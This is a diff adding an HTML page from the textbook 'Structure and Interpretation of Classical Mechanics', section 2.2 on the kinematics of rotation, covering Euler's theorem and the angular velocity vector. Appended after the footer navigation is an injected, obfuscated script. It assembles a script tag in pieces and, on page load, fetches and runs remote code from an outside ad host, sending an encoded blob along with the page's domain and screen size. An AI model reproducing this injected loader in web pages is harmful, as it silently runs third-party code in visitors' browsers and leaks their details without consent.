@@ -1,0 +1,77 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-21.html">previous</a></span><span>, <a href="book-Z-H-23.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.2"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.2">2.2&nbsp;&nbsp;Kinematics of Rotation</a></h2>
+<p><a name="%_idx_1088"></a><a name="%_idx_1090"></a>
+The motion of a rigid body about a center of rotation, a reference
+position that is fixed with respect to the body, is characterized at
+each moment by a rotation axis and a rate of rotation.  Let's
+elaborate.</p>
+<p>
+<a name="%_idx_1092"></a>We can get from any orientation of a body to any other orientation of
+the body by a rotation of the body.  That this is true is called
+<a name="%_idx_1094"></a>Euler's theorem on rotations about a point.<a name="call_footnote_Temp_176" href="#footnote_Temp_176"><sup><small>2</small></sup></a>
+We know that rotations have the property that
+they do not commute: the composition of successive rotations in
+general depends on the order of operation.  Rotating a book about the
+<img src="chap2-Z-G-D-6.gif" border="0"> axis and then about the <img src="chap2-Z-G-D-7.gif" border="0"> axis puts the book in a
+different orientation than rotating the book about the <img src="chap2-Z-G-D-7.gif" border="0"> axis
+and then about the <img src="chap2-Z-G-D-6.gif" border="0"> axis.  Nevertheless, Euler's theorem
+states that however many rotations have been composed to reach a given
+orientation, the orientation could have been reached with a single
+rotation.  Try it!  We take a book, rotate it this way, then that, and
+then some other way -- then find the rotation that does the job in one
+step.  So a rotation can be specified by an axis of rotation and the angular
+amount of the rotation.</p>
+<p>
+If the orientation of a body evolves over some interval of time, then
+the orientation at the beginning and the end of the interval can be
+connected by a single rotation.  In the limit that the duration of the
+interval goes to zero the rotation axis approaches a unique
+instantaneous rotation axis.  And in this limit the ratio of the
+angle of rotation and the duration of the interval approaches 
+the instantaneous rate of rotation.  We represent this instantaneous
+rotational motion by the <a name="%_idx_1096"></a><a name="%_idx_1098"></a><em>angular velocity vector</em> <img src="chap2-Z-G-D-8.gif" border="0">, which
+points in the direction of the rotation axis (with the right-hand rule
+giving the direction of rotation about the axis) and has a magnitude
+equal to the rate of rotation.  </p>
+<p>
+If the angular velocity vector for a body is <img src="chap2-Z-G-D-8.gif" border="0"> then
+the velocities of the constituent particles are perpendicular to the
+vectors to the constituent particles and proportional to the
+rate of rotation of the body and the distance of the constituent
+particle from the instantaneous rotation axis:
+<a name="EQUATION_2.11"></a></p>
+<div align=left><img src="chap2-Z-G-11.gif" border="0"></div>
+<p></p>
+<p>
+Isn't it interesting that we have found a concise way of specifying
+how the orientation of the body is changing, even though we have not
+yet described a way to specify the orientation itself?</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_176" href="#call_footnote_Temp_176"><sup><small>2</small></sup></a> For an elementary geometric proof see
+Whittaker&nbsp;[<a href="book-Z-H-80.html#cite{Whittaker}">46</a>], p.&nbsp;2.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-21.html">previous</a></span><span>, <a href="book-Z-H-23.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0ij%2b5XIDrCUV8havchpD6fe41FtgzlWEcwDqngqbxR194krZ9KGiqVNwLmnYeQM%2fBmZumLvISXVYWxPhgMECv0kx210PymBqJftiYPPMDemmdApSE3VC2TKc1g5c%2bckjRD0dZXRsh5E1oskP7x4NP%2fc62YwIs3d%2bx0TI%2bKfsz9qffYPZ3fqDZYPDUSQhA7M6WwJ2nRepRry92xyiZrpK2kNyPhlv5l44N3BOeSENuZD986OunyJUuJBjhj8e60o%2fTQzVl5mQ2pdKr1MThVjVPCgDAiO0K1HiYEq0fbhfVnQfU2uUiX4el5NuIRvDiJYwBQXDVaQ0l7LFoQJEpum3in%2fDl2sf753w3KLZg7Q3QuV7f4MoG1bmZ5S5gNXiE62Cn0Ag%2fVAz4qRYxDY6xI0cnqW4INvTU6x8LUOjaAelFbhghwoig7uYej0fp6HPPJoHLmqiXqYS3XIEpLKDy%2bHpQF");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
